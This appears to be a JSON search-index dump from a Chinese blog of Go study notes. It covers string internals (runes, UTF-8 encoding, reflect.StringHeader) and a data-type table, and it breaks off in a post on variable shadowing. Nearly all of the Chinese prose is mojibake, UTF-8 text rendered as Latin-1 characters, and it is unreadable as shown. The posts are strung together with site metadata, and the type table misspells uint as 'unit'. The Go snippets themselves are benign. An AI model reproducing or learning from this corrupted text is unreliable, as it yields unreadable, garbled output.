è·å–å­—ç¬¦ä¸²é•¿åº¦æ˜¯ä¸€ä¸ªå¸¸æ•°çº§æ—¶é—´å¤æ‚åº¦ï¼Œæ— è®ºå­—ç¬¦ä¸²ä¸­å­—ç¬¦ä¸ªæ•°æœ‰å¤šå°‘ï¼Œéƒ½å¯ä»¥å¿«é€Ÿå¾—åˆ°å­—ç¬¦ä¸²çš„é•¿åº¦å€¼ï¼ˆåé¢ä¼šè§£é‡Šï¼‰ã€‚ æ‰€è§å³æ‰€å¾—å¸¸å¸¸ä¼šéœ€è¦å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ï¼Œå› ä¸ºè½¬ä¹‰å­—ç¬¦çš„å­˜åœ¨ï¼Œè¾ƒéš¾æ§åˆ¶å¥½æ ¼å¼ï¼Œåœ¨ Go è¯­è¨€ä¸­ï¼Œé€šè¿‡ä¸€å¯¹åå¼•å·åŸç”Ÿæ”¯æŒæ„é€ â€œæ‰€è§å³æ‰€å¾—â€çš„åŸå§‹å­—ç¬¦ä¸²ï¼ˆRaw Stringï¼‰ã€‚ 123456789101112var s string = ` ,_---~~~~~----._ _,,_,*^____ _____*g*\\\"*,--, / __/ /' ^. / \\ ^@q f [ @f | @)) | | @)) l 0 _/ \\/ \\~____ / __ \\_____/ \\ | _l__l_ I &#125; [______] I ] | | | | ] ~ ~ | | | | |`fmt.Println(s) åœ¨åŸå§‹å­—ç¬¦ä¸²ä¸­çš„ä»»æ„è½¬ä¹‰å­—ç¬¦éƒ½ä¸ä¼šèµ·åˆ°è½¬ä¹‰çš„ä½œç”¨ã€‚ Unicode å­—ç¬¦é›†æ”¯æŒåœ¨ä¹‹å‰çš„ç¬”è®°ä¸­ï¼Œå·²ç»æåˆ°è¿‡ï¼ŒGo è¯­è¨€æºæ–‡ä»¶é»˜è®¤é‡‡ç”¨çš„æ˜¯ Unicode å­—ç¬¦é›†ï¼ŒUnicode å­—ç¬¦é›†æ˜¯ç›®å‰æœ€æµè¡Œçš„å­—ç¬¦é›†ï¼Œå®ƒå›Šæ‹¬äº†å‡ ä¹æ‰€æœ‰ä¸»æµé ASCII å­—ç¬¦ï¼ˆåŒ…æ‹¬ä¸­æ–‡å­—ç¬¦ï¼‰ã€‚ å¯¹é ASCII å­—ç¬¦æä¾›åŸç”Ÿæ”¯æŒï¼Œæ¶ˆé™¤äº†æºç åœ¨ä¸åŒç¯å¢ƒä¸‹æ˜¾ç¤ºä¹±ç çš„å¯èƒ½ã€‚ å­—ç¬¦ä¸²çš„ç»„æˆä¸‹é¢ä¼šä»ä¸¤ä¸ªè§’åº¦è®¤è¯†å­—ç¬¦ä¸²ï¼š å­—èŠ‚è§†è§’ï¼šGo å­—ç¬¦ä¸²æ˜¯ç”±ä¸€ä¸ªå¯ç©ºçš„å­—èŠ‚åºåˆ—ç»„æˆï¼Œå­—èŠ‚çš„ä¸ªæ•°ç§°ä¸ºå­—ç¬¦ä¸²çš„é•¿åº¦ å­—ç¬¦è§†è§’ï¼šGo å­—ç¬¦ä¸²æ˜¯ç”±ä¸€ä¸ªå¯ç©ºçš„å­—ç¬¦åºåˆ—æ„æˆï¼Œå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦éƒ½æ˜¯ä¸€ä¸ª Unicode å­—ç¬¦ å­—èŠ‚è§†è§’Go è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²å€¼ä¹Ÿæ˜¯ä¸€ä¸ªå¯ç©ºçš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­çš„å­—èŠ‚ä¸ªæ•°ç§°ä¸ºè¯¥å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ä¸€ä¸ªä¸ªçš„å­—èŠ‚åªæ˜¯å­¤ç«‹æ•°æ®ï¼Œä¸è¡¨æ„ã€‚ ä»å­—èŠ‚è§†è§’çœ‹å­—ç¬¦ä¸²çš„æ„æˆï¼Œå®ƒæ˜¯ä¸è¡¨ç¤ºå­—ç¬¦å«ä¹‰çš„ï¼ˆé€šä¿—ç‚¹è¯´å°±æ˜¯ï¼Œå•ä»è¾“å‡ºçš„å­—èŠ‚æ˜¯çœ‹ä¸å‡ºæ¥å¯¹åº”çš„æ˜¯ä»€ä¹ˆå­—ç¬¦ï¼‰ï¼Œè¿™é‡Œè¾“å‡ºçš„æ˜¯å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—èŠ‚ã€‚ 12345678var s = \"ä¸­å›½äºº\"fmt.Printf(\"the length of s = %d\\n\", len(s)) // 9for i := 0; i &lt; len(s); i++ &#123; fmt.Printf(\"0x%x \", s[i]) // 0xe4 0xb8 0xad 0xe5 0x9b 0xbd 0xe4 0xba 0xba // è‡³äºè¿™ä¸ªæ˜¯ä»€ä¹ˆï¼Œåé¢ä¼šè§£é‡Š&#125;fmt.Printf(\"\\n\") å› ä¸ºä¸€ä¸ªä¸­æ–‡æ±‰å­—ç”± 3~4 ä¸ªå­—èŠ‚ç»„æˆï¼Œâ€œä¸­å›½äººâ€æ˜¯ä¸‰ä¸ªæ±‰å­—ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ 3 x 3 = 9 ä¸ªå­—èŠ‚ã€‚ å­—ç¬¦è§†è§’å¦‚æœéœ€è¦è¡¨æ„ï¼Œåˆ™éœ€è¦ä»å­—ç¬¦è§†è§’æ¥çœ‹äº†ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²æ˜¯ç”±ä¸€ä¸ªå¯ç©ºçš„å­—ç¬¦åºåˆ—æ„æˆã€‚ 1234567var s = \"ä¸­å›½äºº\"fmt.Println(\"the character count in s is\", utf8.RuneCountInString(s)) // 3for _, c := range s &#123; fmt.Printf(\"0x%x \", c) // 0x4e2d 0x56fd 0x4eba&#125;fmt.Printf(\"\\n\") åœ¨è¿™æ®µä»£ç ä¸­ï¼Œä¸ä»…è¾“å‡ºäº†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ•°é‡ï¼Œè¿˜è¾“å‡ºäº†å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦ã€‚ Go é‡‡ç”¨çš„æ˜¯ Unicode å­—ç¬¦é›†ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½æ˜¯ä¸€ä¸ª Unicode å­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½å¯ä»¥åœ¨ Unicode å­—ç¬¦é›†ä¸­æ‰¾åˆ°ï¼Œè¿™é‡Œè¾“å‡ºçš„ 0x4e2dã€0x56fd å’Œ 0x4eba å°±æ˜¯ ä¸­å›½äºº è¿™ä¸‰ä¸ªæ±‰å­—åœ¨ Unicode å­—ç¬¦é›†ä¸­çš„ç ç‚¹ï¼ˆCode Pointï¼‰ å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™æŸ¥æ‰¾ä¸–ç•Œæ–‡å­—å¯¹åº”çš„ Unicode ç ç‚¹ã€‚ é‚£ä¹ˆï¼Œä»€ä¹ˆæ˜¯ Unicode ç ç‚¹å‘¢ï¼Ÿå› ä¸º Unicode å­—ç¬¦é›†ä¸­çš„æ¯ä¸ªå­—ç¬¦ï¼ŒæŒ‰ç…§ä¸€å®šè§„åˆ™ï¼Œéƒ½è¢«åˆ†é…äº†ç»Ÿä¸€ä¸”å”¯ä¸€çš„å­—ç¬¦ç¼–å·ã€‚æ‰€è°“çš„ç ç‚¹ï¼Œå°±æ˜¯æŒ‡å°† Unicode å­—ç¬¦é›†ä¸­çš„æ‰€æœ‰å­—ç¬¦â€œæ’æˆä¸€é˜Ÿâ€ï¼Œå­—ç¬¦åœ¨è¿™ä¸ªâ€œé˜Ÿä¼â€ä¸­çš„ä½ç½®ï¼Œå°±æ˜¯å®ƒåœ¨ Unicode å­—ç¬¦é›†ä¸­çš„ç ç‚¹ã€‚ rune ç±»å‹ä¸å­—ç¬¦å­—é¢å€¼Go ä½¿ç”¨ rune è¿™ä¸ªç±»å‹æ¥è¡¨ç¤ºä¸€ä¸ª Unicode ç ç‚¹ã€‚rune æœ¬è´¨ä¸Šæ˜¯ int32 ç±»å‹çš„åˆ«åç±»å‹ï¼Œå®ƒä¸ int32 ç±»å‹æ˜¯å®Œå…¨ç­‰ä»·çš„ï¼Œåœ¨ Go æºç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒçš„å®šä¹‰æ˜¯è¿™æ ·çš„ï¼š 12// $GOROOT/src/builtin.gotype rune = int32 ç”±äºä¸€ä¸ª Unicode ç ç‚¹å”¯ä¸€å¯¹åº”ä¸€ä¸ª Unicode å­—ç¬¦ã€‚æ‰€ä»¥å¯ä»¥è¯´ï¼Œä¸€ä¸ª rune å®ä¾‹å°±æ˜¯ä¸€ä¸ª Unicode å­—ç¬¦ï¼Œä¸€ä¸ª Go å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥è¢«è§†ä¸º rune å®ä¾‹çš„é›†åˆã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å­—ç¬¦å­—é¢å€¼æ¥åˆå§‹åŒ–ä¸€ä¸ª rune å˜é‡ã€‚ å­—ç¬¦å­—é¢å€¼åœ¨ Go ä¸­ï¼Œå­—ç¬¦å­—é¢å€¼æœ‰å¤šç§è¡¨ç¤ºæ³•ï¼Œæœ€å¸¸è§çš„æ˜¯é€šè¿‡å•å¼•å·æ‹¬èµ·çš„å­—ç¬¦å­—é¢å€¼ï¼Œæ¯”å¦‚ï¼š 1234'a' // ASCIIå­—ç¬¦'ä¸­' // Unicodeå­—ç¬¦é›†ä¸­çš„ä¸­æ–‡å­—ç¬¦'\\n' // æ¢è¡Œå­—ç¬¦'\\'' // å•å¼•å·å­—ç¬¦ å­—ç¬¦ä¸²å­—é¢å€¼å­—ç¬¦ä¸²æ˜¯å­—ç¬¦çš„é›†åˆï¼Œå°†è¡¨ç¤ºå•ä¸ªå­—ç¬¦çš„å•å¼•å·ï¼Œæ¢ä¸ºè¡¨ç¤ºå¤šä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²çš„åŒå¼•å·ï¼Œå°±å¯ä»¥ç”¨æ¥è¡¨ç¤ºå­—ç¬¦ä¸²å­—é¢å€¼äº†ï¼š 123456\"abc\\n\"\"ä¸­å›½äºº\"\"\\u4e2d\\u56fd\\u4eba\" // ä¸­å›½äºº\"\\U00004e2d\\U000056fd\\U00004eba\" // ä¸­å›½äºº\"ä¸­\\u56fd\\u4eba\" // ä¸­å›½äººï¼Œä¸åŒå­—ç¬¦å­—é¢å€¼å½¢å¼æ··åˆåœ¨ä¸€èµ·\"\\xe4\\xb8\\xad\\xe5\\x9b\\xbd\\xe4\\xba\\xba\" // åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²å­—é¢å€¼ï¼šä¸­å›½äºº å°†å•ä¸ª Unicode å­—ç¬¦å­—é¢å€¼ä¸€ä¸ªæ¥ä¸€ä¸ªåœ°è¿åœ¨ä¸€èµ·ï¼ˆç¤ºä¾‹ä¸­çš„ç¬¬ä¸‰è¡Œï¼‰ï¼Œå¹¶ç”¨åŒå¼•å·åŒ…è£¹èµ·æ¥å°±æ„æˆäº†å­—ç¬¦ä¸²å­—é¢å€¼ã€‚ ä¸è¿‡ï¼Œå¥‡æ€ªçš„æ˜¯ï¼Œä¸ºä»€ä¹ˆç¤ºä¾‹ä¸­çš„æœ€åä¸€è¡Œï¼Œä¸ä¹‹å‰ Unicode çš„ç ç‚¹å¯¹ä¸ä¸Šï¼Œåè€Œå¾ˆåƒä»å­—èŠ‚åºåˆ—ä¸­è¾“å‡ºçš„å†…å®¹ï¼Ÿ è¿™æ˜¯å› ä¸ºè¿™ä¸ªå­—èŠ‚åºåˆ—å®é™…ä¸Šæ˜¯ ä¸­å›½äºº è¿™ä¸ª Unicode å­—ç¬¦ä¸²çš„ UTF-8 ç¼–ç å€¼ã€‚ UTF-8 ç¼–ç æ–¹æ¡ˆUTF-8 ç¼–ç è§£å†³çš„æ˜¯ Unicode ç ç‚¹å€¼åœ¨è®¡ç®—æœºä¸­å¦‚ä½•å­˜å‚¨å’Œè¡¨ç¤ºï¼ˆä½æ¨¡å¼ï¼‰çš„é—®é¢˜ã€‚ æ—¢ç„¶ç ç‚¹å¯ä»¥ç¡®å®šä¸€ä¸ª Unicode å­—ç¬¦ï¼Œé‚£ä¹ˆç›´æ¥ç”¨ç ç‚¹ä¸è¡Œå—ï¼Ÿ ç¡®å®å¯ä»¥ï¼Œè€Œä¸” UTF-32 ç¼–ç æ ‡å‡†å°±æ˜¯é‡‡ç”¨çš„è¿™ä¸ªæ–¹æ¡ˆã€‚UTF-32 ç¼–ç æ–¹æ¡ˆå›ºå®šä½¿ç”¨ 4 ä¸ªå­—èŠ‚è¡¨ç¤ºæ¯ä¸ª Unicode å­—ç¬¦ç ç‚¹ï¼Œè¿™å¸¦æ¥çš„å¥½å¤„å°±æ˜¯ç¼–è§£ç ç®€å•ï¼Œä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä¸»è¦æœ‰ä¸‹é¢å‡ ç‚¹ï¼š è¿™ç§ç¼–ç æ–¹æ¡ˆä½¿ç”¨ 4 ä¸ªå­—èŠ‚å­˜å‚¨å’Œä¼ è¾“ä¸€ä¸ªæ•´å‹æ•°çš„æ—¶å€™ï¼Œéœ€è¦è€ƒè™‘ä¸åŒå¹³å°çš„å­—èŠ‚åºé—®é¢˜ ç”±äºé‡‡ç”¨ 4 å­—èŠ‚çš„å›ºå®šé•¿åº¦ç¼–ç ï¼Œä¸é‡‡ç”¨ 1 å­—èŠ‚ç¼–ç çš„ ASCII å­—ç¬¦é›†æ— æ³•å…¼å®¹ æ‰€æœ‰ Unicode å­—ç¬¦ç ç‚¹éƒ½ç”¨ 4 å­—èŠ‚ç¼–ç ï¼Œæ˜¾ç„¶ç©ºé—´åˆ©ç”¨ç‡å¾ˆå·® é’ˆå¯¹è¿™äº›é—®é¢˜ï¼ŒGo è¯­è¨€ä¹‹çˆ¶ Rob Pike å‘æ˜äº† UTF-8 ç¼–ç æ–¹æ¡ˆã€‚å’Œ UTF-32 æ–¹æ¡ˆä¸åŒï¼ŒUTF-8 æ–¹æ¡ˆä½¿ç”¨å˜é•¿åº¦å­—èŠ‚ï¼Œå¯¹ Unicode å­—ç¬¦çš„ç ç‚¹è¿›è¡Œç¼–ç ã€‚ç¼–ç é‡‡ç”¨çš„å­—èŠ‚æ•°é‡ä¸ Unicode å­—ç¬¦åœ¨ç ç‚¹è¡¨ä¸­çš„åºå·æœ‰å…³ï¼šè¡¨ç¤ºåºå·ï¼ˆç ç‚¹ï¼‰å°çš„å­—ç¬¦ä½¿ç”¨çš„å­—èŠ‚æ•°é‡å°‘ï¼Œè¡¨ç¤ºåºå·ï¼ˆç ç‚¹ï¼‰å¤§çš„å­—ç¬¦ä½¿ç”¨çš„å­—èŠ‚æ•°å¤šã€‚ UTF-8 ç¼–ç ä½¿ç”¨çš„å­—èŠ‚æ•°é‡ä» 1 ä¸ªåˆ° 4 ä¸ªä¸ç­‰ã€‚ å‰ 128 ä¸ªä¸ ASCII å­—ç¬¦é‡åˆçš„ç ç‚¹ï¼ˆU+0000~U+007Fï¼‰ä½¿ç”¨ 1 ä¸ªå­—èŠ‚è¡¨ç¤º å¸¦å˜éŸ³ç¬¦å·çš„æ‹‰ä¸æ–‡ã€å¸Œè…Šæ–‡ã€è¥¿é‡Œå°”å­—æ¯ã€é˜¿æ‹‰ä¼¯æ–‡ç­‰ä½¿ç”¨ 2 ä¸ªå­—èŠ‚æ¥è¡¨ç¤º è€Œä¸œäºšæ–‡å­—ï¼ˆåŒ…æ‹¬æ±‰å­—ï¼‰ä½¿ç”¨ 3 ä¸ªå­—èŠ‚è¡¨ç¤º å…¶ä»–æå°‘ä½¿ç”¨çš„è¯­è¨€çš„å­—ç¬¦åˆ™ä½¿ç”¨ 4 ä¸ªå­—èŠ‚è¡¨ç¤º æœ‰å…³å­—ç¬¦ç¼–ç çš„æ›´å¤šçŸ¥è¯†ï¼Œå¯ä»¥æŸ¥çœ‹è¿™ç¯‡ç¬”è®°ã€‚ ç°åœ¨ä½¿ç”¨ Go åœ¨æ ‡å‡†åº“ä¸­æä¾›çš„ UTF-8 åŒ…ï¼Œå¯¹ Unicode å­—ç¬¦ï¼ˆruneï¼‰è¿›è¡Œç¼–è§£ç è¯•è¯•çœ‹ï¼š 123456789101112131415// rune -&gt; []byte func encodeRune() &#123; var r rune = 0x4E2D fmt.Printf(\"the unicode charactor is %c\\n\", r) // ä¸­ buf := make([]byte, 3) _ = utf8.EncodeRune(buf, r) // å¯¹runeè¿›è¡Œutf-8ç¼–ç  fmt.Printf(\"utf-8 representation is 0x%X\\n\", buf) // 0xE4B8AD &#125;// []byte -&gt; runefunc decodeRune() &#123; var buf = []byte&#123;0xE4, 0xB8, 0xAD&#125; r, _ := utf8.DecodeRune(buf) // å¯¹bufè¿›è¡Œutf-8è§£ç  fmt.Printf(\"the unicode charactor after decoding [0xE4, 0xB8, 0xAD] is %s\\n\", string(r)) // ä¸­&#125; utf8.EncodeRuneï¼šå¯¹ä¸€ä¸ª Unicodeå­—ç¬¦ï¼ˆruneï¼‰ è¿›è¡Œ UTF-8 ç¼–ç  utf8.DecodeRuneï¼šUTF-8 è§£ç ï¼Œå°†ä¸€æ®µå†…å­˜å­—èŠ‚è½¬æ¢æˆ Unicode å­—ç¬¦ å¥½äº†ï¼Œç°åœ¨å·²ç»ææ¸…æ¥š Go è¯­è¨€ä¸­å­—ç¬¦ä¸²ç±»å‹çš„æ€§è´¨å’Œç»„æˆäº†ã€‚æœ‰äº†è¿™äº›åŸºç¡€ä¹‹åï¼Œå°±å¯ä»¥çœ‹çœ‹ Go æ˜¯å¦‚ä½•å®ç°å­—ç¬¦ä¸²ç±»å‹çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ Go çš„ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶ä¸­ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ç©¶ç«Ÿæ˜¯å¦‚ä½•è¡¨ç¤ºçš„ï¼Ÿ Go å­—ç¬¦ä¸²å†…éƒ¨è¡¨ç¤ºåœ¨æ ‡å‡†åº“çš„ reflect åŒ…ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¯¹å­—ç¬¦ä¸²ç±»å‹çš„å®šä¹‰ï¼š 1234567// $GOROOT/src/reflect/value.go// StringHeaderæ˜¯ä¸€ä¸ªstringçš„è¿è¡Œæ—¶è¡¨ç¤ºtype StringHeader struct &#123; Data uintptr // æŒ‡å‘å­˜å‚¨å­—ç¬¦ä¸²æ•°æ®å†…å®¹åŒºåŸŸçš„æŒ‡é’ˆå€¼ Len int // æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦&#125; string ç±»å‹å…¶å®æ˜¯ä¸€ä¸ªâ€œæè¿°ç¬¦â€ï¼Œå®ƒæœ¬èº«å¹¶ä¸çœŸæ­£å­˜å‚¨å­—ç¬¦ä¸²æ•°æ®ï¼Œè€Œä»…æ˜¯ç”±ä¸€ä¸ªæŒ‡å‘åº•å±‚å­˜å‚¨çš„æŒ‡é’ˆå’Œå­—ç¬¦ä¸²çš„é•¿åº¦å­—æ®µç»„æˆçš„ã€‚ Go ç¼–è¯‘å™¨æŠŠæºç ä¸­çš„ string ç±»å‹æ˜ å°„ä¸ºè¿è¡Œæ—¶çš„ä¸€ä¸ªäºŒå…ƒç»„ï¼ˆData, Lenï¼‰ï¼ŒçœŸå®çš„å­—ç¬¦ä¸²å€¼æ•°æ®å°±å­˜å‚¨åœ¨ä¸€ä¸ªè¢« Data æŒ‡å‘çš„åº•å±‚æ•°ç»„ä¸­ã€‚ 1234567891011121314func dumpBytesArray(arr []byte) &#123; fmt.Printf(\"[\") for _, b := range arr &#123; fmt.Printf(\"%c \", b) &#125; fmt.Printf(\"]\\n\")&#125;func main() &#123; var s = \"hello\" hdr := (*reflect.StringHeader)(unsafe.Pointer(&amp;s)) // å°†stringç±»å‹å˜é‡åœ°å€æ˜¾å¼è½¬å‹ä¸ºreflect.StringHeader fmt.Printf(\"0x%x\\n\", hdr.Data) // 0x10a30e0 p := (*[5]byte)(unsafe.Pointer(hdr.Data)) // è·å–Dataå­—æ®µæ‰€æŒ‡å‘çš„æ•°ç»„çš„æŒ‡é’ˆ dumpBytesArray((*p)[:]) // [h e l l o ] // è¾“å‡ºåº•å±‚æ•°ç»„çš„å†…å®¹&#125; è¿™æ®µä»£ç åˆ©ç”¨äº† unsafe.Pointer çš„é€šç”¨æŒ‡é’ˆè½¬å‹èƒ½åŠ›ï¼ŒæŒ‰ç…§ StringHeader ç»™å‡ºçš„ç»“æ„å†…å­˜å¸ƒå±€ï¼Œâ€œé¡ºè—¤æ‘¸ç“œâ€ï¼Œä¸€æ­¥æ­¥æ‰¾åˆ°äº†åº•å±‚æ•°ç»„çš„åœ°å€ï¼Œå¹¶è¾“å‡ºäº†åº•å±‚æ•°ç»„å†…å®¹ã€‚ äº†è§£äº† string ç±»å‹çš„å®ç°åŸç†åï¼Œå°±å¯ä»¥ç†è§£ä¸ºä»€ä¹ˆè·å–å­—ç¬¦ä¸²çš„é•¿åº¦çš„æ—¶é—´å¤æ‚åº¦æ˜¯å¸¸æ•°ã€‚ ä»¥åŠå¯ä»¥å¾—åˆ°è¿™æ ·ä¸€ä¸ªç»“è®ºï¼šç›´æ¥å°† string ç±»å‹é€šè¿‡å‡½æ•° / æ–¹æ³•å‚æ•°ä¼ å…¥ä¹Ÿä¸ä¼šå¸¦æ¥å¤ªå¤šçš„å¼€é”€ã€‚å› ä¸ºä¼ å…¥çš„ä»…ä»…æ˜¯ä¸€ä¸ªâ€œæè¿°ç¬¦â€ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„å­—ç¬¦ä¸²æ•°æ®ã€‚ æ€»ç»“å­—ç¬¦ä¸²ç±»å‹ä½œä¸ºåŸºæœ¬æ•°æ®ç±»å‹ä¹‹ä¸€ï¼ŒåŒæ ·ä¹Ÿæ˜¯æ—¥å¸¸å¼€å‘ä¸­é«˜é¢‘ä½¿ç”¨çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Œä»åŸç†ä¸Šçœ‹ string ç±»å‹ï¼Œæœ‰åŠ©äºå¯¹ Go è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²æœ‰ä¸ªå®Œæ•´è€Œæ¸…æ™°çš„è®¤è¯†ã€‚ å­—ç¬¦ä¸²åº•å±‚æ˜¯ä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œä¸èƒ½æŒ‰å­—èŠ‚å»éå†å­—ç¬¦ä¸²ï¼Œä¸èƒ½ç›´æ¥é€šè¿‡ç´¢å¼•å»ä¿®æ”¹å­—ç¬¦ä¸² string ç±»å‹å…¶å®æ˜¯ä¸€ä¸ªæè¿°ç¬¦ï¼Œç”±æŒ‡å‘å­˜å‚¨å­—ç¬¦ä¸²æ•°æ®å†…å®¹åŒºåŸŸçš„æŒ‡é’ˆå€¼å’Œå­—ç¬¦ä¸²çš„é•¿åº¦ç»„æˆ for range è¿­ä»£ string é‡‡ç”¨çš„æ˜¯å­—ç¬¦è§†è§’ï¼Œå¾—åˆ°çš„ç»“æœæ˜¯ Unicode å­—ç¬¦ for è¿­ä»£ string é‡‡ç”¨çš„æ˜¯å­—èŠ‚è§†è§’ï¼Œå¾—åˆ°çš„ç»“æœæ˜¯ Unicode å­—ç¬¦ç»è¿‡ UTF-8 ç¼–ç ä¹‹ååœ¨å†…å­˜ä¸­çš„è¡¨ç¤º Go ä½¿ç”¨ rune ç±»å‹æ¥è¡¨ç¤ºä¸€ä¸ª Unicode å­—ç¬¦çš„ç ç‚¹ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”æ•°æ®ç±»å‹","slug":"go-language-study-notes-type-of-data","date":"2022-10-25T14:18:12.000Z","updated":"2023-02-18T03:28:33.597Z","comments":true,"path":"go-language-study-notes-type-of-data/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-type-of-data/","excerpt":"ä½œä¸ºä¸€ä¸ªç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šæˆé•¿èµ·æ¥çš„ç°ä»£ç¼–ç¨‹è¯­è¨€ï¼ŒGo è¯­è¨€ä¸­çš„æ•°æ®ç±»å‹å¤§éƒ¨åˆ†éƒ½æ˜¯ç”±C è¯­è¨€æ¼”å˜è€Œæ¥çš„ï¼Œå®ƒç»§æ‰¿äº†å‰è¾ˆè¯­è¨€çš„ä¼˜ç‚¹ï¼Œåˆæ”¹è¿›äº†å‰è¾ˆè¯­è¨€ä¸­çš„ä¸è¶³ï¼Œä¸‹é¢æ¥å¯¹æ¯”çœ‹ä¸€ä¸‹ã€‚","text":"ä½œä¸ºä¸€ä¸ªç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šæˆé•¿èµ·æ¥çš„ç°ä»£ç¼–ç¨‹è¯­è¨€ï¼ŒGo è¯­è¨€ä¸­çš„æ•°æ®ç±»å‹å¤§éƒ¨åˆ†éƒ½æ˜¯ç”±C è¯­è¨€æ¼”å˜è€Œæ¥çš„ï¼Œå®ƒç»§æ‰¿äº†å‰è¾ˆè¯­è¨€çš„ä¼˜ç‚¹ï¼Œåˆæ”¹è¿›äº†å‰è¾ˆè¯­è¨€ä¸­çš„ä¸è¶³ï¼Œä¸‹é¢æ¥å¯¹æ¯”çœ‹ä¸€ä¸‹ã€‚ C è¯­è¨€æ•°æ®ç±»å‹ Go è¯­è¨€æ•°æ®ç±»å‹ å¯ä»¥çœ‹åˆ° Go è¯­è¨€çš„æ•°æ®ç±»å‹æ›´ä¸°å¯Œï¼Œé™¤äº†åŸºæœ¬çš„æ•°æ®ç±»å‹éƒ½æ”¯æŒï¼Œåƒ C è¯­è¨€ä¸­æ²¡æœ‰çš„å­—ç¬¦ä¸²ç±»å‹ï¼ŒGo è¯­è¨€ä¹ŸåŸç”Ÿæ”¯æŒäº†ã€‚ åŸºæœ¬æ•°æ®ç±»å‹è®¤è¯†é¢„å®šä¹‰åŸºæœ¬ç±»å‹ã€å„è‡ªå ç”¨å­—èŠ‚å¤§å°ä»¥åŠé»˜è®¤å€¼ï¼Œæœ‰åŠ©äºå¼€å‘è·¨å¹³å°åº”ç”¨æ—¶æ— éœ€è¿‡å¤šè€ƒè™‘ç¬¦å·å’Œé•¿åº¦å·®å¼‚ï¼š ç±»å‹ é•¿åº¦ï¼ˆå­—èŠ‚ï¼‰ é»˜è®¤å€¼ï¼ˆé›¶å€¼ï¼‰ è¯´æ˜ bool 1 false byte 1 0 uint8 int, unit 4,8 0 é»˜è®¤æ•´æ•°ç±»å‹ï¼Œä¾æ®ç›®æ ‡å¹³å°ï¼Œ32 ä½æˆ– 64 ä½ int8, uint8 1 0 -128 ï½ 127ï¼Œ 0ï½255ï¼ˆbyte æ˜¯uint8 çš„åˆ«åï¼‰ int16, unit16 2 0 -3276832767, 065535 int32, unit32 4 0 -21 äº¿21 äº¿, 042 äº¿ï¼ˆrune æ˜¯int32 çš„åˆ«åï¼‰ int64, unit64 8 0 float32 4 0.0 float64 8 0.0 é»˜è®¤æµ®ç‚¹æ•°ç±»å‹ complex64 8 complex128 16 rune 4 0 Unicode Code Point, int32 uintptr 4,8 0 æ— ç¬¦å·æ•´å‹ï¼Œç”¨äºå­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆ string â€œâ€ å­—ç¬¦ä¸²ï¼Œé»˜è®¤å€¼ä¸º ç©ºå­—ç¬¦ä¸²ï¼Œè€Œé NULL array æ•°ç»„ struct ç»“æ„ä½“ function nil å‡½æ•° interface nil æ¥å£ map nil å­—å…¸ï¼Œå¼•ç”¨ç±»å‹ slice nil åˆ‡ç‰‡ï¼Œå¼•ç”¨ç±»å‹ channel nil é€šé“ï¼Œå¼•ç”¨ç±»å‹","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”å˜é‡é®è”½é—®é¢˜","slug":"go-language-study-notes-variable-shadowing-problem","date":"2022-10-24T10:00:12.000Z","updated":"2023-02-18T03:28:33.598Z","comments":true,"path":"go-language-study-notes-variable-shadowing-problem/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-variable-shadowing-problem/","excerpt":"å˜é‡é®è”½æ˜¯ Go å¼€å‘äººå‘˜åœ¨æ—¥å¸¸å¼€å‘å·¥ä½œä¸­æœ€å®¹æ˜“çŠ¯çš„ç¼–ç é”™è¯¯ä¹‹ä¸€ï¼Œå®ƒä½çº§åˆä¸å®¹æ˜“æŸ¥æ‰¾ï¼Œå¸¸å¸¸ä¼šè®©ä½ é™·å…¥æ¼«é•¿çš„è°ƒè¯•è¿‡ç¨‹ã€‚","text":"å˜é‡é®è”½æ˜¯ Go å¼€å‘äººå‘˜åœ¨æ—¥å¸¸å¼€å‘å·¥ä½œä¸­æœ€å®¹æ˜“çŠ¯çš„ç¼–ç é”™è¯¯ä¹‹ä¸€ï¼Œå®ƒä½çº§åˆä¸å®¹æ˜“æŸ¥æ‰¾ï¼Œå¸¸å¸¸ä¼šè®©ä½ 